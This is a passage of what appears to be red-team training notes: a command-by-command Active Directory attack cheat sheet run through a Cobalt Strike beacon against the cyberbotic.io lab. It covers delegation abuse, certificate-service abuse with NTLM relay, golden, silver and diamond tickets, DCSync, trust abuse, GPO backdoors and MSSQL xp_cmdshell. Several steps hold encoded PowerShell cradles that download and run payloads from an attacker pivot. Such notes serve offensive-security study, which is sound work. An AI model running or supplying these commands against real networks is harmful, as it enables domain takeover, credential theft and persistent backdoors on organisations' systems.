beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

2. Dumping the cached TGT ticket (requires system access on affected system)
beacon> getuid
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap

3. Execute PrintSpool attack to force DC to authenticate with WEB 
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io

4. Use Machine TGT (DC) fetched to gain RCE on itself using S4U abuse (/self flag)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap

5. Inject the ticket and access the service
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=

beacon> steal_token 2664
beacon> ls \\dc-2.dev.cyberbotic.io\c$


# Constrained Delegation (allows to request TGS for any user using its TGT)

1. Identify the computer objects having Constrained Delegation is enabled
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json

2. Dump the TGT of User/Computer Account having constrained Delegation enabled (use asktgt if NTLM hash)
beacon> getuid
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

3. Use S4U technique to request TGS for delegated service using machines TGT (Use S4U2Proxy tkt)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$ /ticket:doIFLD[...snip...]MuSU8= /nowrap

4. OR, Access other alternate Service not stated in Delegation attribute (ldap)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /altservice:ldap /user:sql-2$ /ticket:doIFpD[...]MuSU8= /nowrap

5. Inject the S4U2Proxy tkt from previous step
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv

6. Access the services 
beacon> steal_token 5540
beacon> ls \\dc-2.dev.cyberbotic.io\c$
beacon> dcsync dev.cyberbotic.io DEV\krbtgt


# Resource-Based Constrained Delegation (Systems having writable msDS-AllowedToActOnBehalfOfOtherIdentity)

1. Identify the Computer Objects which has AllowedToActOnBehalfOfOtherIdentity attribute defined
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" --attributes dnshostname,samaccountname,msDS-AllowedToActOnBehalfOfOtherIdentity --json

2. OR, Identify the Domain Computer where we can write this atribute with custom value 
beacon> powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107

3. Next we will assign delegation rights to our computer by modifying the attribute of target system
beacon> powerpick Get-DomainComputer -Identity wkstn-2 -Properties objectSid
beacon> powerpick $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose

4. Verify the updated attribute
beacon> powerpick Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

5. Get the TGT of our computer
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

6. Use S4U technique to get TGS for target computer using our TGT
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIFuD[...]5JTw== /nowrap

7. Access the services
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD[...]MuaW8=

beacon> steal_token 4092
beacon> ls \\dc-2.dev.cyberbotic.io\c$

8 Remove the delegation rights
beacon> powerpick Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity

OR, Create Fake computer Account for RBCD Attack

9. Check if we have permission to create computer account (default allowed)
beacon> powerpick Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota

10. Create a fake computer with random password (generate hash using Rubeus)
beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make
PS> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io

11. Use the Hash to get TGT for our fake computer, and rest of the steps remains same
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap

```

### Active Directory Certificate Services

```powershell
# Finding Certificate Authorities
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas

# Miconfigured Certificate template
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable

# Attack Case 1: _ENROLLEE_SUPPLIES_SUBJECT_

beacon> getuid
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb

ubuntu@DESKTOP-3BSK7NO ~> openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

ubuntu@DESKTOP-3BSK7NO ~> cat cert.pfx | base64 -w 0

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /password:pass123 /nowrap


# Attack Case 2 : NTLMRelay on CA web endpoint

# NTLM Relaying to ADCS HTTP Endpoints
- Web End point for certificate services is at http[s]://<hostname>/certsrv.
- Redirect the NTLM auth traffic using PrintSpool attack from DC to CA (if services running on seperate system) to fetch the DC Certificate
- But if they are both running on same server then we can execute the attack targetting a system where unconstrained delegation (WEB) is allowed, and force it to authenticate with CA to capture its certificate
- Do the same setup for ntlmrelayx and use print spooler to force DC/WEB to authenticate with wkstn2


1. Setup socks proxy (beacon session)
beacon> socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging

2. Setup Proxychains to use this proxy
$ sudo vim /etc/proxychains.conf
socks5 127.0.0.1 1080 socks_user socks_password

3. Execute NTLMRelayx to target the certificate server endpoint
attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t https://10.10.122.10/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

4. Setup reverse port forwarding (System shell)
beacon> rportfwd 8445 127.0.0.1 445

5. Upload PortBender driver and load its cna file (System shell)
beacon> cd C:\Windows\system32\drivers
beacon> upload C:\Tools\PortBender\WinDivert64.sys
beacon> PortBender redirect 445 8445

6. Use PrintSpool attack to force WEB (unconstrained) server to authenticate with wkstn 2 (Domain Sesion)
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.122.30 10.10.123.102

7. Use the Base64 encoded machine certificate obtained to get TGT of machine account
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /nowrap

8. Use the TGT ticket obtained for S4U attack to get a service ticket
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap

9. Inject the Service Ticket by creating a new sacrificial token
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=

10. Steal token and access the service
beacon> steal_token 1234
beacon> ls \\web.dev.cyberbotic.io\c$


## User and Computer Persistance

# User Persistance

1. Enumerate user certificate from their Personal Certificate store (execute from user session)
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates

2. Export the certificate as DER and PFX file on disk
beacon> mimikatz crypto::certificates /export

3. Encode the PFX file to be used with Rubeus
ubuntu@DESKTOP-3BSK7NO ~> cat /mnt/c/Users/Attacker/Desktop/CURRENT_USER_My_0_Nina\ Lamb.pfx | base64 -w 0

4. Use certificate to request TGT for the user (/enctype:aes256 - Better OPSEC)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIINeg[...]IH0A== /password:mimikatz /enctype:aes256 /nowrap

5. if certificate is not present then requst from his loggedin session and then follow above steps
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:User

# Computer Persistance 

1. Export the machine certificate (requires elevated session)
beacon> mimikatz !crypto::certificates /systemstore:local_machine /export

2. Encode the certificate, and use it to get TGT for machine account
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-1$ /enctype:aes256 /certificate:MIINCA[...]IH0A== /password:mimikatz /nowrap

3. If machine certificate it not stored, we can requet it using Certify (/machine param is required for auto elevation to system privilege)
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:Machine /machine

```

### Group Policy

```powershell

# Modify Existing GPO

1. Identify GPO where current principal has modify rights
beacon> powerpick Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

2. Resolve GPOName, Path and SID of principal
beacon> powerpick Get-DomainGPO -Identity "CN={AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath

beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107

beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F}

3. Identify the domain OU where the above GPO applies
beacon> powerpick Get-DomainOU -GPLink "{AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F}" | select distinguishedName

4. Identify the systems under the given OU
beacon> powerpick Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName

5. Setup a pivot listener(1234) on the beacon, and download & execute cradle pointing to pivot (80)
PS> IEX ((new-object net.webclient).downloadstring("http://wkstn-2:8080/pivot"))


6. Enable inbound traffic on Pivot Listener (1234) and WebDrive by ports (8080) (requires system access)
beacon> powerpick New-NetFirewallRule -DisplayName "Rule 1" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 1234
beacon> powerpick New-NetFirewallRule -DisplayName "Rule 2" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080

7. Setup port forwarding rule to accept the Payload Download request locally and forward to our team server 
beacon> rportfwd 8080 127.0.0.1 80

8. Use sharpGPOAbuse to add the backdoor (scheduled task) for execution on targetted system
beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "C:\Windows\System32\cmd.exe" --Arguments "/c powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwB3AGsAcwB0AG4ALQAyADoAOAAwADgAMAAvAHAAaQB2AG8AdAAiACkAKQA=" --GPOName "Vulnerable GPO"


# Create and Link new GPO

1. Check the rights to create a new GPO in Domain
beacon> powerpick Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }

2. Find the OU where any principal has "Write gPlink Privilege"
beacon> powerpick Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl

beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
DEV\Developers

3. Verify if RSAT module is installed for GPO abuse
beacon> powerpick Get-Module -List -Name GroupPolicy | select -expand ExportedCommands

4. Create a new GPO & configure it to execute attacker binary via Registry loaded from shared location
beacon> powerpick New-GPO -Name "Evil GPO"

beacon> powerpick Find-DomainShare -CheckShareAccess
beacon> cd \\dc-2\software
beacon> upload C:\Payloads\pivot.exe
beacon> powerpick Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\pivot.exe" -Type ExpandString

5. Link newly created GPO with OU
beacon> powerpick Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"

```


### MSSQL Servers

```powershell

# Use PowerUpSQL for enumerating MS SQL Server instances
beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
beacon> powerpick Get-SQLInstanceDomain

# Check access to DB instance with current user session
beacon> powerpick Get-SQLConnectionTest -Instance "sql-2.dev.cyberbotic.io,1433" | fl
beacon> powerpick Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433"
beacon> powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo

# Query execution
beacon> powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select @@servername"

# Command Execution
beacon> powerpick Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults

# Interactive access and RCE (xp_cmdshell 0 means it is disabled, needs to be enabled)
ubuntu@DESKTOP-3BSK7NO ~> proxychains mssqlclient.py -windows-auth DEV/bfarmer@10.10.122.25 -debug

SQL> EXEC xp_cmdshell 'whoami';
SQL> SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
SQL> sp_configure 'Show Advanced Options', 1; RECONFIGURE;
SQL> sp_configure 'xp_cmdshell', 1; RECONFIGURE;

SQL> EXEC xp_cmdshell 'powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBwAGkAdgBvAHQAIgApAA==';

# Lateral Movement (using DB Links)
beacon> powerpick Get-SQLServerLink -Instance "sql-2.dev.cyberbotic.io,1433"
beacon> powerpick Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433"
beacon> powerpick Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433" -Query "exec master..xp_cmdshell 'whoami'"

SQL> SELECT * FROM master..sysservers;
SQL> SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');
SQL> SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');

SQL> EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
SQL> EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql-1.cyberbotic.io]

SQL> SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAHAAaQB2AG8AdAAyACIAKQA=''')

# MSSQL PrivEsc - Service Account (SeImpersonate) to System 

beacon> getuid
beacon> shell whoami /priv
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges

beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAHQAYwBwAC0AbABvAGMAYQBsACIAKQA="

beacon> connect localhost 4444
```

### Domain Dominance

	psexec |  CIFS 
	winrm  |  HOST & HTTP 
	dcsync (DCs only) | LDAP

```powershell

# Silver Ticket (offline)

1. Fetch the kerberos ekeys using mimikatz
beacon> mimikatz !sekurlsa:ekeys

2. Generate the silver Ticket TGS offline using Rubeus (use /rc4 flag for NTLM hash)
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/wkstn-1.dev.cyberbotic.io /aes256:c9e598cd2a9b08fe31936f2c1846a8365d85147f75b8000cbc90e3c9de50fcc7 /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

3. Inject the ticket and Verify the access 
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFXD[...]MuaW8=
beacon> steal_token 5668
beacon> ls \\wkstn-1.dev.cyberbotic.io\c$


# Golden Ticket (offline)

1. Fetch the NTLM/AES hash of krbtgt account
beacon> dcsync dev.cyberbotic.io DEV\krbtgt

2. Generate Golden ticket offline using Rubeus
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

3. Inject golden ticket and gain acess
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

beacon> steal_token 5060
beacon> run klist
beacon> ls \\dc-2.dev.cyberbotic.io\c$


# Diamond Ticket (online)

1. Fetch the SID of Ticket User
beacon> powerpick ConvertTo-SID dev/nlamb

2. Create Diamond ticket (512 - Enterprise Group ID, krbkey - Hash of KRBRGT account)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap

3. Verify the specs of Diamond ticket vs Golden ticket
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFYj[...snip...]MuSU8=


# Forged certificates (DC or CA Server)

1. Dump the Private Key and Certificate of CA (to be executed on DC/CA)
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine

2. Save the certificate in .pem file and convert into pfx format using openssl
ubuntu@DESKTOP-3BSK7NO ~> openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

3. Next, use the stolen CA cert to generate fake cert for nlamb user
PS C:\Users\Attacker> C:\Tools\ForgeCert\ForgeCert\bin\Release\ForgeCert.exe --CaCertPath .\Desktop\sub-ca.pfx --CaCertPassword pass123 --Subject "CN=User" --SubjectAltName "nlamb@cyberbotic.io" --NewCertPath .\Desktop\fake.pfx --NewCertPassword pass123

4. Encode the certificate
ubuntu@DESKTOP-3BSK7NO ~> cat cert.pfx | base64 -w 0

5. Use the certificate to get TGT for nlamb user
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /enctype:aes256 /certificate:MIACAQ[...snip...]IEAAAA /password:pass123 /nowrap

6. Inject the ticket and access the service
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

beacon> steal_token 5060
beacon> run klist
beacon> ls \\dc-2.dev.cyberbotic.io\c$

```

### Forest & Domain Trusts

```powershell

# Enumerate the Domain Trust (Use -Domain attribute to enumerate other domains)
beacon> powerpick Get-DomainTrust



## PrivEsc : Child (DEV.CYBERBOTIC.IO) to Parent (CYBERBOTIC.IO) within Same Domain via SID History

# Enumerate basic info required for creating forged ticket
beacon> powerpick Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid
beacon> powerpick Get-DomainController -Domain cyberbotic.io | select Name
beacon> powerpick Get-DomainGroupMember -Identity "Domain Admins" -Domain cyberbotic.io | select MemberName

# Use Golden Ticket technique
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /sids:S-1-5-21-2594061375-675613155-814674916-512 /nowrap

# Or, Use Diamond Ticket technique
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-2594061375-675613155-814674916-519 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap

# Inject the ticket
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

beacon> steal_token 5060
beacon> run klist
beacon> ls \\dc-1.cyberbotic.io\c$
beacon> jump psexec64 dc-1.cyberbotic.io PeerSambhar
beacon> dcsync cyberbotic.io cyber\krbtgt



## Exploiting Inbound Trusts (Users in our domain can access resources in foreign domain) 

# We can enumerate the foreign domain with inbound trust
beacon> powerpick Get-DomainTrust
beacon> powerpick Get-DomainComputer -Domain dev-studio.com -Properties DnsHostName

# Check if members in current domain are part of any group in foreign domain
beacon> powerpick Get-DomainForeignGroupMember -Domain dev-studio.com
beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1120
beacon> powerpick Get-DomainGroupMember -Identity "Studio Admins" | select MemberName
beacon> powerpick Get-DomainController -Domain dev-studio.com | select Name

# Fetch the AES256 hash of nlamb user identfied in previous steps
beacon> dcsync dev.cyberbotic.io dev\nlamb

# We can create Inter-Realm TGT for user identified in above steps (/aes256 has users hash)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /aes256:a779fa8afa28d66d155d9d7c14d394359c5d29a86b6417cb94269e2e84c4cee4 /nowrap

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/dev-studio.com /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFwj[...]MuaW8= /nowrap

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/dc.dev-studio.com /domain:dev-studio.com /dc:dc.dev-studio.com /ticket:doIFoz[...]NPTQ== /nowrap

# Inject the ticket
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

beacon> steal_token 5060
beacon> run klist
beacon> ls \\dc.dev-studio.com\c$



## Exploiting Outbound Trusts (Users in other domain can access resources in our domain)

# Enumerate the outbound trust (msp.com) in parent domain (cyberbotic.io)
beacon> powerpick Get-DomainTrust -Domain cyberbotic.io

# Enumerate the TDO to fetch the shared trust key 
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain cyberbotic.io --attributes distinguishedName,name,flatName,trustDirection

# To be execute on the DC having outbound trust
beacon> run hostname 
beacon> mimikatz lsadump::trust /patch

# OR, Use DCSync to get the ntlm hash of TDO object remotely
beacon> powerpick Get-DomainObject -Identity "CN=msp.org,CN=System,DC=cyberbotic,DC=io" | select objectGuid
beacon> mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}

# There is a "trust account" which gets created in trusted domain (msp.com) by the name of trusting domain (CYBER$), it can be impersonated to gain normal user access (/rc4 is the NTLM hash of TDO Object)

beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=user)"

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:CYBER$ /domain:msp.org /rc4:f3fc2312d9d1f80b78e67d55d41ad496 /nowrap

# Inject the ticket
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:MSP /username:CYBER$ /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

beacon> steal_token 5060
beacon> run klist
beacon> powerpick Get-Domain -Domain msp.org

```

### LAPS

```powershell

# Check for presence of LAPS 

# LAPS client installed on local machine
beacon> ls C:\Program Files\LAPS\CSE

# Computer Object having ms-Mcs-AdmPwd and ms-Mcs-AdmPwdExpirationTime attribute set
powerpick Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName

# LAPS configuration deplayed through GPO
beacon> powerpick Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Download LAPS configuration
beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine

beacon> download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine\Registry.pol

# Parse the LAPS GPO Policy file downloaded in previous step 
PS C:\Users\Attacker> Parse-PolFile .\Desktop\Registry.pol

# Identify the principals who have read right to LAPS password

beacon> powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier

beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107

# Use Laps Toolkit to identify Groups & Users who can read LAPS password
beacon> powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
